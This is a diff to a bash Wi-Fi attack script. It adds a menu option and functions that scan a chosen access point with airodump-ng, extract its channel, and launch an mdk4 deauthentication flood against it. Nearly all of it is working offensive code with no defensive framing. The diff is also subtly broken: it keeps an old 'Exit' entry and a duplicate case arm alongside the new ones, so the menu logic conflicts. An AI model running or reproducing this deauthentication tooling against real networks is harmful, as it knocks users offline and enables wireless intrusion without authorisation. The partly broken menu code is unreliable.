@@ -4320,12 +4320,18 @@ function attack {
 		echo "Attack in progress .."
 		echo "                                       "
 		echo "      1) Choose another network"
+		echo "      2) ADV-MDK4"
+		echo -e "      3) scan "$yellow"$Host_SSID"$transparent""
+		echo "      4) Exit"
 		echo "      2) Exit"
 		echo " "
 		echo -n '      ###> '
 		read yn
 		case $yn in
 			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
+			2 ) newwwww; break;;
+			3 ) scant; break;;
+			4 ) matartodo; exitmode; break;;
 			2 ) matartodo; exitmode; break;;
 			* ) echo "
 $general_case_error"; conditional_clear ;;
@@ -4551,6 +4557,88 @@ function deauthmdk4 {
 	
 }
 
+function newwwww {
+
+
+
+echo "$Host_MAC" >$DUMP_PATH/mdk4.txt
+mkdir $DUMP_PATH/skn/
+
+
+xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#000000" -fg "#FF0000" -e airodump-ng --encrypt WPA --bssid $Host_MAC -w $DUMP_PATH/skn/skn -a $WIFI_MONITOR --ignore-negative-one &
+
+
+sleep 5
+killall airodump-ng &>$mortal_output_device
+killall mdk4 &>$mortal_output_device
+clear
+
+Hidden=`cat $DUMP_PATH/skn/skn-01.csv | grep $Host_MAC | cut -d',' -f4 | sed '1s/^.//'`
+
+
+
+
+
+sleep 2
+
+xterm $CENTRIGHT -bg black -fg purple -e mdk4 $WIFI_MONITOR d -b $DUMP_PATH/mdk4.txt -c $Hidden &
+
+
+
+rm -R $DUMP_PATH/skn/
+
+
+
+while true; do
+		top
+
+		echo "Attack in progress .."
+		echo "                                       "
+		echo "      1) Choose another network"
+		echo "      2) ADV-MDK4"
+		echo -e "      3) scan "$yellow"$Host_SSID"$transparent""
+		echo "      4) Exit"
+		echo " "
+		echo -n '      ###> '
+		read yn
+		case $yn in
+			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
+			2 ) newwwww; break;;
+			3 ) scant; break;;
+			4 ) matartodo; exitmode; break;;
+			* ) echo "
+$general_case_error"; conditional_clear ;;
+		esac
+	done
+
+}
+function scant {
+xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#000000" -fg "#FF0000" -e airodump-ng --encrypt WPA --bssid $Host_MAC -a $WIFI_MONITOR &
+sleep 10
+killall airodump-ng &>$mortal_output_device
+
+while true; do
+		top
+
+		echo "Attack in progress .."
+		echo "                                       "
+		echo "      1) Choose another network"
+		echo "      2) ADV-MDK4"
+		echo -e "      3) scan "$yellow"$Host_SSID"$transparent""
+		echo "      4) Exit"
+		echo " "
+		echo -n '      ###> '
+		read yn
+		case $yn in
+			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
+			2 ) newwwww; break;;
+			3 ) scant; break;;
+			4 ) matartodo; exitmode; break;;
+			* ) echo "
+$general_case_error"; conditional_clear ;;
+		esac
+	done
+}
 # Deauth to a specific target
 function deauthesp {
 
